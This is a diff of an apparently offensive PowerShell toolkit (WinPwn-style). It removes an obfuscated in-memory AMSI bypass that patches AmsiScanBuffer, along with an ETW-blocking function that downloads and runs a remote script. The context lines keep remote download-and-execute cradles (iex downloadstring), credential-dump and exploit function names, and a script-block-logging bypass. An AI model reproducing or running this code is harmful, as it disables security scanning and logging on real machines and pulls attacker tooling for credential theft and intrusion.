@@ -1,38 +1,6 @@
 #  Global TLS Setting for all functions. If TLS12 isn't suppported you will get an exception when using the -Verbose parameter.
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Ssl2 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12
 
-function AmsiBypass
-{
-    #This is Rastamouses in memory patch method 
-    $ztzsw = @"
-using System;
-using System.Runtime.InteropServices;
-public class ztzsw {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr msrelr, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-
-  Add-Type $ztzsw
-
-  $kgqdegv = [ztzsw]::LoadLibrary("$([CHar](97)+[CHar](109*53/53)+[cHAR]([ByTE]0x73)+[chAr]([bYTE]0x69)+[char]([byTE]0x2e)+[cHar](100*35/35)+[Char]([bytE]0x6c)+[ChAr]([BYtE]0x6c))")
-  $dfwxos = [ztzsw]::GetProcAddress($kgqdegv, "$([char]([BytE]0x41)+[CHar]([byTE]0x6d)+[ChAR]([byTe]0x73)+[Char](105+69-69)+[ChAr](83+2-2)+[cHaR]([BYTe]0x63)+[chAR]([bYtE]0x61)+[Char]([Byte]0x6e)+[CHAr](42+24)+[CHAR](117+79-79)+[CHAR](88+14)+[cHAR]([bYte]0x66)+[CHAR](101+22-22)+[cHar]([bYTe]0x72))")
-  $p = 0
-  $qddw = "0xB8"
-  $fwyu = "0x80"
-  $bsyb = "0x57"
-  [ztzsw]::VirtualProtect($dfwxos, [uint32]5, 0x40, [ref]$p)
-  $ymfa = "0x07"
-  $zcbf = "0x00"
-  $dned = "0xC3"
-  $msueg = [Byte[]] ($qddw,$bsyb,$zcbf,$ymfa,+$fwyu,+$dned)
-  [System.Runtime.InteropServices.Marshal]::Copy($msueg, 0, $dfwxos, 6)
-
-}
 
 $Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
 
@@ -168,7 +136,7 @@ function sharpcradle{
     )
     
     if(!$consoleoutput){pathcheck}
-    BlockEtw
+    
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if ($allthosedotnet)
     {
@@ -542,7 +510,7 @@ function Kittielocal
     )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if(!$consoleoutput){pathcheck}
-    AmsiBypass
+    
     if ($noninteractive)
     {
         if ($credentialmanager)
@@ -829,7 +797,7 @@ function Safedump
         )
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if(!$consoleoutput){pathcheck}
-    blocketw
+    
     iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     
 	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
@@ -1226,7 +1194,7 @@ function CVE-2019-1129
 
 function CVE-2019-1069
 {
-	blocketw
+	
 	iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
       $polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069?'
       if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
@@ -4973,11 +4941,6 @@ function Mimiload
   mimiload
 }
 
-function BlockEtw
-{
-  iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-BlockETW.ps1')
-  Invoke-BlockETW
-}
     
 function WinPwn
 {
@@ -5085,7 +5048,7 @@ __        ___       ____
         pathcheck
     }
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    AmsiBypass
+    
 	
 	#Added repo parameter by 0x23353435
 	If ($repo)
@@ -5097,7 +5060,7 @@ __        ___       ____
     $Script:S3cur3Th1sSh1t_repo = "https://raw.githubusercontent.com/S3cur3Th1sSh1t"
     }
 	
-    BlockEtw
+    
 	
 
     if ($noninteractive)
@@ -5240,3 +5203,4 @@ function scriptblocklogbypass
         $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
   }
 }
+
